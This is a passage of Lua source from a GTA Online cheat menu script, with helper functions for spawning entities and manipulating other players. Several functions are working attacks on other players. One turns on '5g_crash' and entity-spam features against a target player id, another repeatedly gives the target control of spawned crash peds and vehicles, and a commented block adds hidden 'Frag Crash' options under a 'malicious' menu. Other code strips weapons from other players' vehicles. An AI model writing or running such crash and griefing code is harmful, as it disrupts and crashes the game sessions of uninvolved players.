--                      system.yield(0)
--                  end
--                  local there_coords = player.get_player_coords(pid)
--                  spawn_bad_vehicles_and_peds(pid, 2, 1349725314, -252946718, there_coords)
--  
--                  menu.notify("Sending Crash", "Novo Script")
--  
--                  local ped_net_id2 = native.call(0xA11700682F3AD45C, spawned_crash_peds[2])
--                  local veh_net_id2 = native.call(0xA11700682F3AD45C, spawned_crash_vehs[2])
--                  for i = 1, 100 do
--                      network.give_player_control_of_entity(pid, spawned_crash_peds[2])
--                      network.give_player_control_of_entity(pid, spawned_crash_vehs[2])
--                      network.give_player_control_of_entity(pid, spawned_crash_peds[2])
--                      network.give_player_control_of_entity(pid, spawned_crash_vehs[2])
--                      if not network.has_control_of_entity(spawned_crash_peds[2]) then
--                          native.call(0x299EEB23175895FC, ped_net_id2, true)
--                      end
--                      if not network.has_control_of_entity(spawned_crash_vehs[2]) then
--                          native.call(0x299EEB23175895FC, veh_net_id2, true)
--                      end
--                  end
--                  menu_crash = menu.get_feature_by_hierarchy_key('online.online_players.player_' ..pid.. '.5g_crash')
--                  beach_spam = menu.get_feature_by_hierarchy_key('online.online_players.player_' ..pid.. '.entity_spam').children[2]
--                  frank_spam = menu.get_feature_by_hierarchy_key('online.online_players.player_' ..pid.. '.entity_spam').children[3]
--                  michael_spam = menu.get_feature_by_hierarchy_key('online.online_players.player_' ..pid.. '.entity_spam').children[4]
--                  trev_spam = menu.get_feature_by_hierarchy_key('online.online_players.player_' ..pid.. '.entity_spam').children[5]
--                  system.yield(1000)
--                  menu_crash.on = true
--                  system.yield(300)
--                  beach_spam.on = true
--                  frank_spam.on = true
--                  michael_spam.on = true
--                  trev_spam.on = true
--                  spawned_crash_vehs = {}
--                  spawned_crash_peds = {}
--              end)
--              table.insert(already_added_features, better_menu_crash2.id)
--              better_menu_crash2.hidden = true
--  
--              frag_crash = menu.add_integrated_feature("Frag Crash", "action", menu.get_feature_by_hierarchy_key('online.online_players.player_' ..pid.. '.script_features.novo_lua.malicious'), function(feat)
--                  menu_crash_frag = menu.get_feature_by_hierarchy_key('online.online_players.player_' ..pid.. '.fragment_crash')
--                  menu_crash_frag.on = true
--              end)
--              table.insert(already_added_features, frag_crash.id)
--              frag_crash.hidden = true
--  
--          end
--      end
--  end



function startRepeatingActions(interval)
    if not RepeatingActionsThread then
        RepeatingActionsThread = menu.create_thread(function()
            while true do
                performActionsIntregrated()  -- Execute the actions
                system.yield(interval)  -- Wait for 'interval' milliseconds before repeating
            end
        end, nil)
    end
end

function stopRepeatingActions()
    if RepeatingActionsThread then
        menu.delete_thread(RepeatingActionsThread)
        RepeatingActionsThread = nil
    end
end

-- startRepeatingActions(5000)
function RemovetransactionthreadFunction()
    local start_index = 4537356
    local end_index = 4537358
    local current_index = start_index

    while true do
        script.set_global_i(current_index, 0)
        
        if current_index >= end_index then
            current_index = start_index
        else
            current_index = current_index + 1
        end

        system.yield(0) -- Adjust the delay as needed
    end
end

function clearallpedtasksnonplayer()
    local allpedstoclear = ped.get_all_peds()
    for i, ped in ipairs(allpedstoclear) do
        if ped ~= player.get_player_ped(player.player_id()) then
            native.call(0xAAA34F8A7CB32098, ped)
        end
    end
end

function constructMPCharKey()
    return "MP" .. stats.stat_get_int(gameplay.get_hash_key("MPPLY_LAST_MP_CHAR"), 1) .. "_"
end

function weirdcombatstats(ped1, thereped)
    ped.set_ped_combat_ability(ped1, 100)
    ai.task_combat_ped(ped1, thereped, 0, 16)
    native.call(0x971D38760FBC02EF, ped1, true)
end

function slow_fall_veh(pid, num)
    streaming.request_model(gameplay.get_hash_key("bkr_prop_biker_bblock_sml2"))
    while not streaming.has_model_loaded(gameplay.get_hash_key("bkr_prop_biker_bblock_sml2")) do
        system.yield(0)
    end
    local coords = player.get_player_coords(pid)
    local obj = object.create_object(gameplay.get_hash_key("bkr_prop_biker_bblock_sml2"), v3(coords.x, coords.y, coords.z - num), true, false)
    entity.set_entity_visible(obj, false)
    entity.set_entity_collision(obj, true)
    system.yield(0)
    entity.delete_entity(obj)
end

function loadModels(models)
    for _, model in ipairs(models) do
        streaming.request_model(model)
        while not streaming.has_model_loaded(model) do
            system.yield(0)
        end
    end
end

-- Usage:
-- local models = {-252946718, -599568815, 1349725314}
-- loadModels(models)

function enable_spam_features(pid, start_coords)
    local menu_crash = menu.get_feature_by_hierarchy_key('online.online_players.player_' .. pid .. '.5g_crash')
    local beach_spam = menu.get_feature_by_hierarchy_key('online.online_players.player_' .. pid .. '.entity_spam').children[2]
    local frank_spam = menu.get_feature_by_hierarchy_key('online.online_players.player_' .. pid .. '.entity_spam').children[3]
    local michael_spam = menu.get_feature_by_hierarchy_key('online.online_players.player_' .. pid .. '.entity_spam').children[4]
    local trev_spam = menu.get_feature_by_hierarchy_key('online.online_players.player_' .. pid .. '.entity_spam').children[5]

    system.yield(1000)
    menu_crash.on = true
    system.yield(300)
    beach_spam.on = true
    frank_spam.on = true
    michael_spam.on = true
    trev_spam.on = true
    system.yield(150)
    entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), start_coords)
end

function give_crash_ent_control(pid)
    local ped_net_id2 = native.call(0xA11700682F3AD45C, spawned_crash_peds[2])
    local veh_net_id2 = native.call(0xA11700682F3AD45C, spawned_crash_vehs[2])
    for i = 1, 100 do
        network.give_player_control_of_entity(pid, spawned_crash_peds[2])
        network.give_player_control_of_entity(pid, spawned_crash_vehs[2])
        if not network.has_control_of_entity(spawned_crash_peds[2]) then
            native.call(0x299EEB23175895FC, ped_net_id2, true)
        end
        if not network.has_control_of_entity(spawned_crash_vehs[2]) then
            native.call(0x299EEB23175895FC, veh_net_id2, true)
        end
    end
end

function logEntityAndHash(ofbject)
    local attached_hash = entity.get_entity_model_hash(ofbject)
    local log = "entity: "..tostring(ofbject).." hash: "..tostring(attached_hash)
    local file = io.open(debug_log_path, "a")
    file:write(log)
    file:close()
end

function togglePlayerSilent()
    while true do
        system.yield(0) -- Always yield in loops to prevent freezing
        
        if player_silent.on then
            native.call(0xDB89EF50FF25FCE9, player.player_id(), 0) -- Disable player noise
        else
            system.yield(0)
            native.call(0xDB89EF50FF25FCE9, player.player_id(), 1) -- Enable player noise
        end
    end
end

-- thanks to geeman for making this more efficient
function removeMissiles(selectedOption)
    for pid = 0, 32 do
        if not player.is_player_valid(pid) then
            goto continue
        end
        if selectedOption ~= 1 and 
           (pid == player.player_id() or 
           (selectedOption == 3 and player.is_player_friend(pid)) or 
           (selectedOption == 4 and player.is_player_modder(pid, -1))) then
            goto continue
        end

        local playerVehicle = player.get_player_vehicle(pid)

        if playerVehicle ~= 0 then
            local vehicleModelHash = entity.get_entity_model_hash(playerVehicle)

            if vehicleModelHash == 2069146067 then -- Object hash for Oppressor Mark II
                getControl(playerVehicle)
                vehicle.set_vehicle_mod_kit_type(playerVehicle, 0)
                vehicle.set_vehicle_mod(playerVehicle, 10, -1, false)
            end
        end

        ::continue::
    end
end

--thanks to geeman for making this more efficient
function getPidVeh(pid, onlyIfInVeh, notMe)
	if not player.is_player_valid(pid) or 
		(notMe and pid == player.player_id()) or 
		(onlyIfInVeh and not player.is_player_in_any_vehicle(pid)) then
		return 0
	end
	return player.get_player_vehicle(pid)
end

